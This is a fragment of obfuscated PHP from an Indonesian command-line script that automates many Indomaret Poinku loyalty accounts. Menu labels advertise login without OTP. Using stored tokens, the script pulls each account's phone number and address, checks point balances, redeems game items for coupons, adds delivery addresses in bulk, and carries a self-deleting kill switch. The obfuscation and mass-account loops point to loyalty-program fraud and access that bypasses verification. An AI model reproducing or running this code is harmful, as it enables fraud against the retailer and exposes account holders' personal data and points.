                                                                                $yy9BI++;
                                                                                goto eM0mo;
                                                                            }
                                                                            lPFhp:
                                                                            echo "\n";
                                                                            echo "Mulai Baris Ke  : ";
                                                                            $jTEU0 = trim(fgets(STDIN));
                                                                            echo "\n";
                                                                            echo "Sampai Baris Ke : ";
                                                                            $S8W9D = trim(fgets(STDIN));
                                                                            $jTEU0;
                                                                            PcWWE:
                                                                            if (!($jTEU0 < $S8W9D)) {
                                                                                eZaFp:
                                                                                if (!($cPDPt == 14)) {
                                                                                    goto CtCqn;
                                                                                }
                                                                                echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                $wd9cN = date("d-m-Y | H:i:s");
                                                                                echo @zM6Ic("green", $wd9cN);
                                                                                echo @zm6IC("nevy", " | TAMBAH ALAMAT\n");
                                                                                echo @ZM6iC("yellow", "Build By FERDY RAMADHAN ");
                                                                                echo @ZM6iC("yellow", "| WA 082176358295 \n");
                                                                                echo @Zm6iC("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                                echo @zm6Ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                                echo @zm6IC("nevy", "\t\t\t\tAAMIIN ");
                                                                                echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                echo "\n";
                                                                                $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                                $efQM2 = count($QRhbE) - 1;
                                                                                $zvt88 = $QRhbE;
                                                                                echo "\n";
                                                                                $yy9BI = "0";
                                                                                echo "\n";
                                                                                $DxrJr = "100000000000000000";
                                                                                $yy9BI;
                                                                                skjRn:
                                                                                if (!($yy9BI < $DxrJr)) {
                                                                                    goto KfEmL;
                                                                                }
                                                                                $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                                $efQM2 = count($QRhbE) - 1;
                                                                                $zvt88 = $QRhbE;
                                                                                $tqWr2 = $zvt88[$yy9BI];
                                                                                $zcN5u = XOZb4(array("|"), $tqWr2)[0];
                                                                                if (!($zcN5u == '')) {
                                                                                    echo $yy9BI . ". ";
                                                                                    print_r($zcN5u);
                                                                                    echo "\n";
                                                                                    $yy9BI++;
                                                                                    goto skjRn;
                                                                                }
                                                                                KfEmL:
                                                                                echo "\n";
                                                                                echo @Zm6iC("yellow", "Notice : Ini Hanya Untuk Pancingan AWAL Harap Pilih 1 Nomor Aja.. \n\n");
                                                                                echo "Mulai Baris Ke  : ";
                                                                                $jTEU0 = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                echo "Sampai Baris Ke : ";
                                                                                $S8W9D = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                echo @Zm6IC("yellow", "Masukkan Detail Alamat  : ");
                                                                                $hGkCN = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                echo @zm6IC("yellow", "Masukkan Email Penerima : ");
                                                                                $z6UZd = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                echo @zM6IC("yellow", "Masukkan Nama  Penerima : ");
                                                                                $m_IIo = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                echo @ZM6iC("yellow", "Masukkan Nomor Penerima : ");
                                                                                $qFy6r = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                echo @zm6Ic("yellow", "Masukkan Nama Kota Anda : ");
                                                                                $ip0vw = trim(fgets(STDIN));
                                                                                echo "\n";
                                                                                $jTEU0;
                                                                                VouNS:
                                                                                if (!($jTEU0 < $S8W9D)) {
                                                                                    $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                                    $efQM2 = count($QRhbE) - 1;
                                                                                    $zvt88 = $QRhbE;
                                                                                    echo "\n";
                                                                                    $yy9BI = "0";
                                                                                    echo "\n";
                                                                                    $DxrJr = "100000000000000000";
                                                                                    $yy9BI;
                                                                                    sJ2Nm:
                                                                                    if (!($yy9BI < $DxrJr)) {
                                                                                        goto lcy0b;
                                                                                    }
                                                                                    $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                                    $efQM2 = count($QRhbE) - 1;
                                                                                    $zvt88 = $QRhbE;
                                                                                    $tqWr2 = $zvt88[$yy9BI];
                                                                                    $zcN5u = xOzb4(array("|"), $tqWr2)[0];
                                                                                    if (!($zcN5u == '')) {
                                                                                        echo $yy9BI . ". ";
                                                                                        print_r($zcN5u);
                                                                                        echo "\n";
                                                                                        $yy9BI++;
                                                                                        goto sJ2Nm;
                                                                                    }
                                                                                    lcy0b:
                                                                                    echo "\n";
                                                                                    echo @zM6ic("yellow", "Lanjut Buat Alamat Akun Lain \n\n");
                                                                                    echo "Mulai Baris Ke  : ";
                                                                                    $jTEU0 = trim(fgets(STDIN));
                                                                                    echo "\n";
                                                                                    echo "Sampai Baris Ke : ";
                                                                                    $S8W9D = trim(fgets(STDIN));
                                                                                    $jTEU0;
                                                                                    pj0Fz:
                                                                                    if (!($jTEU0 < $S8W9D)) {
                                                                                        CtCqn:
                                                                                        if (!($cPDPt == 15)) {
                                                                                            goto MmeTG;
                                                                                        }
                                                                                        echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                        $wd9cN = date("d-m-Y | H:i:s");
                                                                                        echo @ZM6Ic("green", $wd9cN);
                                                                                        echo @Zm6ic("nevy", " | Script IDM LOGIN POINKU TANPA OTP\n");
                                                                                        echo @ZM6Ic("yellow", "Build By FERDY RAMADHAN ");
                                                                                        echo @zm6ic("yellow", "| WA 082176358295 \n");
                                                                                        echo @zm6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                                        echo @Zm6iC("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                                        echo @ZM6Ic("nevy", "\t\t\t\tAAMIIN ");
                                                                                        echo @ZM6iC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                        echo "\n";
                                                                                        $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                                        $efQM2 = count($QRhbE) - 1;
                                                                                        $zvt88 = $QRhbE;
                                                                                        echo "\n";
                                                                                        $yy9BI = "0";
                                                                                        echo "\n";
                                                                                        $DxrJr = "100000000000000000";
                                                                                        $yy9BI;
                                                                                        aCWFZ:
                                                                                        if (!($yy9BI < $DxrJr)) {
                                                                                            goto fZnQ2;
                                                                                        }
                                                                                        $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                                        $efQM2 = count($QRhbE) - 1;
                                                                                        $zvt88 = $QRhbE;
                                                                                        $tqWr2 = $zvt88[$yy9BI];
                                                                                        $zcN5u = xoZB4(array("|"), $tqWr2)[0];
                                                                                        if (!($zcN5u == '')) {
                                                                                            echo $yy9BI . ". ";
                                                                                            print_r($zcN5u);
                                                                                            echo "\n";
                                                                                            $yy9BI++;
                                                                                            goto aCWFZ;
                                                                                        }
                                                                                        fZnQ2:
                                                                                        echo "\n";
                                                                                        echo "Mulai Baris Ke  : ";
                                                                                        $jTEU0 = trim(fgets(STDIN));
                                                                                        echo "\n";
                                                                                        echo "Sampai Baris Ke : ";
                                                                                        $S8W9D = trim(fgets(STDIN));
                                                                                        $jTEU0;
                                                                                        NlIKW:
                                                                                        if (!($jTEU0 < $S8W9D)) {
                                                                                            MmeTG:
                                                                                            if (!($cPDPt == 16)) {
                                                                                                goto e1oJO;
                                                                                            }
                                                                                            echo @ZM6IC("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                            $wd9cN = date("d-m-Y | H:i:s");
                                                                                            echo @zm6ic("green", $wd9cN);
                                                                                            echo @Zm6ic("nevy", " | Script IDM LOGIN POINKU CEK KUPON TANPA OTP\n");
                                                                                            echo @ZM6ic("yellow", "Build By FERDY RAMADHAN ");
                                                                                            echo @Zm6IC("yellow", "| WA 082176358295 \n");
                                                                                            echo @zm6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                                            echo @zM6ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                                            echo @zM6IC("nevy", "\t\t\t\tAAMIIN ");
                                                                                            echo @ZM6ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                            echo "\n";
                                                                                            $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                                            $efQM2 = count($QRhbE) - 1;
                                                                                            $zvt88 = $QRhbE;
                                                                                            echo "\n";
                                                                                            $yy9BI = "0";
                                                                                            echo "\n";
                                                                                            $DxrJr = "100000000000000000";
                                                                                            $yy9BI;
                                                                                            XR1Tf:
                                                                                            if (!($yy9BI < $DxrJr)) {
                                                                                                goto kmnPA;
                                                                                            }
                                                                                            $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                                            $efQM2 = count($QRhbE) - 1;
                                                                                            $zvt88 = $QRhbE;
                                                                                            $tqWr2 = $zvt88[$yy9BI];
                                                                                            $zcN5u = XOZB4(array("|"), $tqWr2)[0];
                                                                                            if (!($zcN5u == '')) {
                                                                                                echo $yy9BI . ". ";
                                                                                                print_r($zcN5u);
                                                                                                echo "\n";
                                                                                                $yy9BI++;
                                                                                                goto XR1Tf;
                                                                                            }
                                                                                            kmnPA:
                                                                                            echo "\n";
                                                                                            echo "Mulai Baris Ke  : ";
                                                                                            $jTEU0 = trim(fgets(STDIN));
                                                                                            echo "\n";
                                                                                            echo "Sampai Baris Ke : ";
                                                                                            $S8W9D = trim(fgets(STDIN));
                                                                                            $jTEU0;
                                                                                            CQ2mu:
                                                                                            if (!($jTEU0 < $S8W9D)) {
                                                                                                e1oJO:
                                                                                                if (!($cPDPt == 17)) {
                                                                                                    goto iwC6F;
                                                                                                }
                                                                                                echo @zm6Ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                                $wd9cN = date("d-m-Y | H:i:s");
                                                                                                echo @Zm6ic("green", $wd9cN);
                                                                                                echo @zm6Ic("nevy", " | Script IDM Cek Poin\n");
                                                                                                echo @zM6IC("yellow", "Build By FERDY RAMADHAN ");
                                                                                                echo @zm6ic("yellow", "| WA 082176358295 \n");
                                                                                                echo @ZM6Ic("nevy", "\t\t  YANG NYEBARIN SCRIPT INI \n");
                                                                                                echo @Zm6ic("nevy", " SEMOGA LOBANG PANTAT NYA BISULAN!!!!! \n");
                                                                                                echo @zm6Ic("nevy", "\t\t\t\tAAMIIN ");
                                                                                                echo @Zm6Ic("red", "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n");
                                                                                                echo "\n";
                                                                                                echo @zM6iC("yellow", "Masukkan Nilai Minimum Poin Mu  : ");
                                                                                                $VW5Jc = trim(fgets(STDIN));
                                                                                                $QRhbE = explode("\n", @file_get_contents("forceclose"));
                                                                                                $efQM2 = count($QRhbE) - 1;
                                                                                                $zvt88 = $QRhbE;
                                                                                                echo "\n";
                                                                                                $yy9BI = "0";
                                                                                                echo "\n";
                                                                                                $DxrJr = "100000000000000000";
                                                                                                $yy9BI;
                                                                                                eVHTx:
                                                                                                if (!($yy9BI < $DxrJr)) {
                                                                                                    goto fl6lv;
                                                                                                }
                                                                                                $QRhbE = explode("\n", @file_get_contents("mytoken"));
                                                                                                $efQM2 = count($QRhbE) - 1;
                                                                                                $zvt88 = $QRhbE;
                                                                                                $tqWr2 = $zvt88[$yy9BI];
                                                                                                $zcN5u = xOZb4(array("|"), $tqWr2)[0];
                                                                                                if (!($zcN5u == '')) {
                                                                                                    echo $yy9BI . ". ";
                                                                                                    print_r($zcN5u);
                                                                                                    echo "\n";
                                                                                                    $yy9BI++;
                                                                                                    goto eVHTx;
                                                                                                }
                                                                                                fl6lv:
                                                                                                echo "\n";
                                                                                                echo "Mulai Baris Ke  : ";
                                                                                                $jTEU0 = trim(fgets(STDIN));
                                                                                                echo "\n";
                                                                                                echo "Sampai Baris Ke : ";
                                                                                                $S8W9D = trim(fgets(STDIN));
                                                                                                $jTEU0;
                                                                                                TA23H:
                                                                                                if (!($jTEU0 < $S8W9D)) {
                                                                                                    iwC6F:
                                                                                                    goto Q7LGl;
                                                                                                }
                                                                                                $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                                                $u35jw = count($m0f8X) - 1;
                                                                                                $lPULW = $m0f8X;
                                                                                                $wZnHP = $lPULW[$jTEU0];
                                                                                                echo "\n";
                                                                                                $zcN5u = XoZb4(array("|"), $wZnHP)[0];
                                                                                                $wlJRC = xoZB4(array("|"), $wZnHP)[1];
                                                                                                $U0YgX = str_replace("\r", '', $zcN5u);
                                                                                                $zn5zd = $U0YgX;
                                                                                                $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                                                $aY0el = $v1ZMX;
                                                                                                $sONlZ = str_replace("\r", '', $rERzL);
                                                                                                $earOL = $sONlZ;
                                                                                                $w5ulg = str_replace("\r", '', $TvVlh);
                                                                                                $GOXkU = $w5ulg;
                                                                                                $obc_G = str_replace("\r", '', $wlJRC);
                                                                                                $mlMLt = $obc_G;
                                                                                                echo @Zm6Ic("nevy", "Akun Ke\t\t: ");
                                                                                                echo $jTEU0;
                                                                                                $Jk9cx = g8pF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                                                $Ap1KM = json_decode($Jk9cx, true);
                                                                                                $M1ADy = @$Ap1KM["data"]["id"];
                                                                                                $p4iky = @$Ap1KM["data"]["memberId"];
                                                                                                $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                                                echo "\n";
                                                                                                echo @zM6IC("green", "Nomor HP Anda  : ");
                                                                                                echo $BcbF3;
                                                                                                echo "\n";
                                                                                                if (!($fUekS == '')) {
                                                                                                    $N0XGD = g8pf2("https://edtsapp.indomaretpoinku.com/loyalty/apix-1502-api/mobile/points/me", $aY0el, $GOXkU, $mlMLt);
                                                                                                    $Ap1KM = json_decode($N0XGD, true);
                                                                                                    $XDyMm = @$Ap1KM["data"]["balance"];
                                                                                                    echo "\n";
                                                                                                    echo @ZM6ic("yellow", "Poin Akun Anda : ");
                                                                                                    echo @ZM6Ic("nevy", $XDyMm);
                                                                                                    echo "\n";
                                                                                                    if (!($XDyMm > $VW5Jc)) {
                                                                                                        goto I1Quu;
                                                                                                    }
                                                                                                    lQjR6("mytoken poin di atas " . $VW5Jc, $zn5zd, $mlMLt);
                                                                                                    I1Quu:
                                                                                                    $jTEU0++;
                                                                                                    goto TA23H;
                                                                                                }
                                                                                                echo "\n";
                                                                                                echo @ZM6IC("nevy", "Sorry, This Script Has Been Removed By The Owner!!");
                                                                                                @unlink("poinhp.php");
                                                                                                @unlink("poinhp.php");
                                                                                                echo "\n";
                                                                                                die;
                                                                                            }
                                                                                            $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                                            $u35jw = count($m0f8X) - 1;
                                                                                            $lPULW = $m0f8X;
                                                                                            $wZnHP = $lPULW[$jTEU0];
                                                                                            echo "\n";
                                                                                            $zcN5u = XoZB4(array("|"), $wZnHP)[0];
                                                                                            $wlJRC = xOZb4(array("|"), $wZnHP)[1];
                                                                                            $U0YgX = str_replace("\r", '', $zcN5u);
                                                                                            $zn5zd = $U0YgX;
                                                                                            $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                                            $aY0el = $v1ZMX;
                                                                                            $sONlZ = str_replace("\r", '', $rERzL);
                                                                                            $earOL = $sONlZ;
                                                                                            $w5ulg = str_replace("\r", '', $TvVlh);
                                                                                            $GOXkU = $w5ulg;
                                                                                            $obc_G = str_replace("\r", '', $wlJRC);
                                                                                            $mlMLt = $obc_G;
                                                                                            echo @ZM6Ic("nevy", "Akun Ke\t\t: ");
                                                                                            echo $jTEU0;
                                                                                            $N0ol8 = XwL4L();
                                                                                            echo "\n";
                                                                                            $Jk9cx = g8pF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                                            $Ap1KM = json_decode($Jk9cx, true);
                                                                                            $M1ADy = @$Ap1KM["data"]["id"];
                                                                                            $p4iky = @$Ap1KM["data"]["memberId"];
                                                                                            $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                                            echo "\n";
                                                                                            echo @zm6iC("green", "Nomor HP Anda  : ");
                                                                                            echo $BcbF3;
                                                                                            echo "\n";
                                                                                            $upOL9 = G8PF2("https://edtsapp.indomaretpoinku.com/%2Fgame%2Fapix-1502-api%2Fcustomer-game%2Fget-count-unused-game", $aY0el, $GOXkU, $mlMLt);
                                                                                            $owfHy = json_decode($upOL9, true);
                                                                                            $POIN9 = @$owfHy["data"]["balance"];
                                                                                            echo @Zm6IC("yellow", "Total BIJI   : ");
                                                                                            echo @zM6IC("nevy", $POIN9);
                                                                                            echo "\n";
                                                                                            $upOL9 = G8Pf2("https://edtsapp.indomaretpoinku.com/game/apix-1502-api/customer-game/get-unused", $aY0el, $GOXkU, $mlMLt);
                                                                                            $owfHy = json_decode($upOL9, true);
                                                                                            $D2zwh = "0";
                                                                                            $ogbF4 = "10000000";
                                                                                            $D2zwh;
                                                                                            hEEWG:
                                                                                            if (!($D2zwh < $ogbF4)) {
                                                                                                goto GsrX0;
                                                                                            }
                                                                                            $l9PIA = @$owfHy["data"]["content"][$D2zwh]["game"]["name"];
                                                                                            $ypyz5 = @$owfHy["data"]["content"][$D2zwh]["id"];
                                                                                            if (!($l9PIA == '')) {
                                                                                                echo "\n";
                                                                                                echo @Zm6Ic("green", "Biji Ke : ");
                                                                                                echo @zM6IC("red", $D2zwh);
                                                                                                echo "\n";
                                                                                                echo @zM6iC("yellow", "Nama Biji : ");
                                                                                                echo @ZM6iC("nevy", $l9PIA);
                                                                                                echo "\n";
                                                                                                $wDisp = "{\"customerGameId\":\"" . $ypyz5 . "\"}";
                                                                                                $ofEkP = a0MYl("https://indomaretpoinku.com/api/gamificationReady", $wDisp, $N0ol8, $M1ADy, $aY0el, $GOXkU, $mlMLt);
                                                                                                $cQFRW = json_decode($ofEkP, true);
                                                                                                $YXsOG = @$cQFRW["message"];
                                                                                                echo "\n";
                                                                                                echo @ZM6IC("yellow", "Status Pecahin Biji : ");
                                                                                                echo @zm6ic("nevy", $YXsOG);
                                                                                                echo "\n";
                                                                                                $wDisp = "{\"customerGameId\":\"" . $ypyz5 . "\"}";
                                                                                                $ofEkP = A0MyL("https://indomaretpoinku.com/api/gamification", $wDisp, $N0ol8, $M1ADy, $aY0el, $GOXkU, $mlMLt);
                                                                                                $cQFRW = json_decode($ofEkP, true);
                                                                                                $qjx5O = @$cQFRW["data"]["couponName"];
                                                                                                $BW_8H = @$cQFRW["data"]["description"];
                                                                                                $SR3ui = @$cQFRW["data"]["couponCode"];
                                                                                                $Fm5gC = @$cQFRW["data"]["expiredDate"];
                                                                                                echo @zm6ic("yellow", "Nama Kuponnya\t: ");
                                                                                                echo @Zm6IC("nevy", $qjx5O);
                                                                                                echo "\n";
                                                                                                echo @ZM6ic("yellow", "Kode Kuponnya\t: ");
                                                                                                echo @zM6iC("nevy", $SR3ui);
                                                                                                echo "\n";
                                                                                                echo @ZM6IC("yellow", "Tanggal Expired  : ");
                                                                                                echo @Zm6ic("nevy", $Fm5gC);
                                                                                                echo "\n";
                                                                                                $D2zwh++;
                                                                                                goto hEEWG;
                                                                                            }
                                                                                            GsrX0:
                                                                                            $jTEU0++;
                                                                                            goto CQ2mu;
                                                                                        }
                                                                                        $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                                        $u35jw = count($m0f8X) - 1;
                                                                                        $lPULW = $m0f8X;
                                                                                        $wZnHP = $lPULW[$jTEU0];
                                                                                        echo "\n";
                                                                                        $zcN5u = XoZB4(array("|"), $wZnHP)[0];
                                                                                        $wlJRC = XOZB4(array("|"), $wZnHP)[1];
                                                                                        $U0YgX = str_replace("\r", '', $zcN5u);
                                                                                        $zn5zd = $U0YgX;
                                                                                        $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                                        $aY0el = $v1ZMX;
                                                                                        $sONlZ = str_replace("\r", '', $rERzL);
                                                                                        $earOL = $sONlZ;
                                                                                        $w5ulg = str_replace("\r", '', $TvVlh);
                                                                                        $GOXkU = $w5ulg;
                                                                                        $obc_G = str_replace("\r", '', $wlJRC);
                                                                                        $mlMLt = $obc_G;
                                                                                        echo @Zm6iC("nevy", "Akun Ke\t\t: ");
                                                                                        echo $jTEU0;
                                                                                        $Jk9cx = g8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                                        $Ap1KM = json_decode($Jk9cx, true);
                                                                                        $M1ADy = @$Ap1KM["data"]["id"];
                                                                                        $p4iky = @$Ap1KM["data"]["memberId"];
                                                                                        $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                                        echo "\n";
                                                                                        echo @ZM6Ic("green", "Nomor HP Anda  : ");
                                                                                        echo $BcbF3;
                                                                                        echo "\n";
                                                                                        $Jk9cx = G8Pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address", $aY0el, $GOXkU, $mlMLt);
                                                                                        $owfHy = json_decode($Jk9cx, true);
                                                                                        $YUfPv = @$owfHy["data"][0]["address"];
                                                                                        $JrTpE = @$owfHy["data"][0]["district"]["city"];
                                                                                        $b2ucB = @$owfHy["data"][0]["district"]["cityName"];
                                                                                        $L1qpJ = @$owfHy["data"][0]["district"]["district"];
                                                                                        $yJiD4 = @$owfHy["data"][0]["district"]["districtName"];
                                                                                        $ZqwwP = @$owfHy["data"][0]["district"]["keyword"];
                                                                                        $Ipl73 = @$owfHy["data"][0]["district"]["province"];
                                                                                        $K4tCB = @$owfHy["data"][0]["district"]["provinceName"];
                                                                                        $D18xv = @$owfHy["data"][0]["id"];
                                                                                        $Bz8Et = @$owfHy["data"][0]["postalCode"]["postalCode"];
                                                                                        $pugmZ = @$owfHy["data"][0]["postalCode"]["postalCodeId"];
                                                                                        $SD3v6 = @$owfHy["data"][0]["recipientEmail"];
                                                                                        $CeRgl = @$owfHy["data"][0]["recipientName"];
                                                                                        $t2tnx = @$owfHy["data"][0]["recipientPhoneNumber"];
                                                                                        $ldzeo = @$owfHy["data"][0]["subDistrict"]["subDistrict"];
                                                                                        $U_EVz = @$owfHy["data"][0]["subDistrict"]["subDistrictCode"];
                                                                                        $xzAuu = @$owfHy["data"][0]["subDistrict"]["value"];
                                                                                        echo "\n";
                                                                                        echo @ZM6Ic("green", "Akun Ke : ");
                                                                                        echo @ZM6IC("red", $jTEU0);
                                                                                        echo "\n";
                                                                                        echo @Zm6Ic("yellow", "Nama Penerima   : ");
                                                                                        echo @zm6ic("nevy", $CeRgl);
                                                                                        echo "\n";
                                                                                        echo @zm6iC("yellow", "Nomor Penerima  : ");
                                                                                        echo @ZM6IC("nevy", $t2tnx);
                                                                                        echo "\n";
                                                                                        echo @zm6ic("yellow", "Email Penerima  : ");
                                                                                        echo @zm6iC("nevy", $SD3v6);
                                                                                        echo "\n";
                                                                                        echo @Zm6iC("yellow", "Nama Kota\t   : ");
                                                                                        echo @ZM6ic("nevy", $yJiD4);
                                                                                        echo "\n";
                                                                                        echo @zM6Ic("yellow", "Nama Kabupaten  : ");
                                                                                        echo @Zm6IC("nevy", $b2ucB);
                                                                                        echo "\n";
                                                                                        echo @Zm6iC("yellow", "Nama Provinsi   : ");
                                                                                        echo @Zm6IC("nevy", $K4tCB);
                                                                                        echo "\n";
                                                                                        echo @zM6ic("yellow", "Nama Desa\t   : ");
                                                                                        echo @ZM6ic("nevy", $ldzeo);
                                                                                        echo "\n";
                                                                                        echo @ZM6Ic("yellow", "Alamat Penerima : ");
                                                                                        echo @ZM6IC("nevy", $YUfPv);
                                                                                        echo "\n";
                                                                                        echo @Zm6iC("yellow", "Postal Code\t : ");
                                                                                        echo @zM6ic("nevy", $Bz8Et);
                                                                                        echo "\n";
                                                                                        echo @Zm6iC("yellow", "Keyword\t\t : ");
                                                                                        echo @zm6IC("nevy", $ZqwwP);
                                                                                        echo "\n\n";
                                                                                        $jTEU0++;
                                                                                        goto NlIKW;
                                                                                    }
                                                                                    $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                                    $u35jw = count($m0f8X) - 1;
                                                                                    $lPULW = $m0f8X;
                                                                                    $wZnHP = $lPULW[$jTEU0];
                                                                                    echo "\n";
                                                                                    $zcN5u = XOZB4(array("|"), $wZnHP)[0];
                                                                                    $wlJRC = xOzB4(array("|"), $wZnHP)[1];
                                                                                    $U0YgX = str_replace("\r", '', $zcN5u);
                                                                                    $zn5zd = $U0YgX;
                                                                                    $v1ZMX = str_replace("\r", '', $wPFxB);
                                                                                    $aY0el = $v1ZMX;
                                                                                    $sONlZ = str_replace("\r", '', $rERzL);
                                                                                    $earOL = $sONlZ;
                                                                                    $w5ulg = str_replace("\r", '', $TvVlh);
                                                                                    $GOXkU = $w5ulg;
                                                                                    $obc_G = str_replace("\r", '', $wlJRC);
                                                                                    $mlMLt = $obc_G;
                                                                                    echo @zM6Ic("nevy", "Akun Ke\t\t: ");
                                                                                    echo $jTEU0;
                                                                                    $Jk9cx = G8pf2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/detail-customer-origin", $aY0el, $GOXkU, $mlMLt);
                                                                                    $Ap1KM = json_decode($Jk9cx, true);
                                                                                    $M1ADy = @$Ap1KM["data"]["id"];
                                                                                    $p4iky = @$Ap1KM["data"]["memberId"];
                                                                                    $BcbF3 = @$Ap1KM["data"]["phoneNumber"];
                                                                                    echo "\n";
                                                                                    echo @Zm6IC("green", "Nomor HP Anda  : ");
                                                                                    echo $BcbF3;
                                                                                    echo "\n";
                                                                                    $wDisp = "{\"keyword\":\"" . $ip0vw . "\"}";
                                                                                    $XTuz1 = g1Wxt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address/district", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                    $owfHy = json_decode($XTuz1, true);
                                                                                    $wDisp = "{\"city\":" . $JrTpE . ",\"cityName\":\"" . $b2ucB . "\",\"district\":" . $L1qpJ . ",\"districtName\":\"" . $yJiD4 . "\",\"keyword\":\"" . $ZqwwP . "\",\"province\":" . $Ipl73 . ",\"provinceName\":\"" . $K4tCB . "\"}";
                                                                                    $XTuz1 = G1wxt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address/sub-district", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                    $owfHy = json_decode($XTuz1, true);
                                                                                    $wDisp = "{\"subDistrict\":\"" . $ldzeo . "\",\"subDistrictCode\":\"" . $U_EVz . "\",\"value\":\"" . $xzAuu . "\"}";
                                                                                    $XTuz1 = g1Wxt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address/postal-code", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                    $owfHy = json_decode($XTuz1, true);
                                                                                    $Bz8Et = @$owfHy["data"][0]["postalCode"];
                                                                                    $pugmZ = @$owfHy["data"][0]["postalCodeId"];
                                                                                    echo "\n";
                                                                                    echo @Zm6iC("green", "Postal Code\t: ");
                                                                                    echo @zm6IC("red", $Bz8Et);
                                                                                    echo "\n";
                                                                                    echo @ZM6ic("yellow", "Postal Code ID : ");
                                                                                    echo @zM6ic("nevy", $pugmZ);
                                                                                    echo "\n";
                                                                                    $wDisp = "{\"address\":\"" . $hGkCN . "\",\"addressName\":\"Rumah\",\"district\":{\"city\":" . $JrTpE . ",\"cityName\":\"" . $b2ucB . "\",\"district\":" . $L1qpJ . ",\"districtName\":\"" . $yJiD4 . "\",\"keyword\":\"" . $ZqwwP . "\",\"province\":" . $Ipl73 . ",\"provinceName\":\"" . $K4tCB . "\"},\"id\":0,\"isPrimary\":false,\"postalCode\":{\"postalCode\":\"" . $Bz8Et . "\",\"postalCodeId\":\"" . $pugmZ . "\"},\"recipientEmail\":\"" . $z6UZd . "\",\"recipientName\":\"" . $m_IIo . "\",\"recipientPhoneNumber\":\"" . $qFy6r . "\",\"subDistrict\":{\"subDistrict\":\"" . $ldzeo . "\",\"subDistrictCode\":\"" . $U_EVz . "\",\"value\":\"" . $xzAuu . "\"}}";
                                                                                    $XTuz1 = G1Wxt("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address", $wDisp, $aY0el, $GOXkU, $mlMLt);
                                                                                    $owfHy = json_decode($XTuz1, true);
                                                                                    $fZ2bz = @$owfHy["message"];
                                                                                    echo "\n";
                                                                                    echo @zm6IC("green", "Status : ");
                                                                                    echo @zM6IC("purple", $fZ2bz);
                                                                                    echo "\n";
                                                                                    $Jk9cx = G8PF2("https://edtsapp.indomaretpoinku.com/customer/apix-1502-api/mobile/customer-address", $aY0el, $GOXkU, $mlMLt);
                                                                                    print_r($Jk9cx);
                                                                                    echo "\n";
                                                                                    echo "\n";
                                                                                    $jTEU0++;
                                                                                    goto pj0Fz;
                                                                                }
                                                                                $m0f8X = explode("\n", @file_get_contents("mytoken"));
                                                                                $u35jw = count($m0f8X) - 1;
                                                                                $lPULW = $m0f8X;
                                                                                $wZnHP = $lPULW[$jTEU0];
                                                                                echo "\n";
                                                                                $zcN5u = xOzb4(array("|"), $wZnHP)[0];
                                                                                $wlJRC = XOzb4(array("|"), $wZnHP)[1];
                                                                                $U0YgX = str_replace("\r", '', $zcN5u);
                                                                                $zn5zd = $U0YgX;
                                                                                $v1ZMX = str_replace("\r", '', $wPFxB);
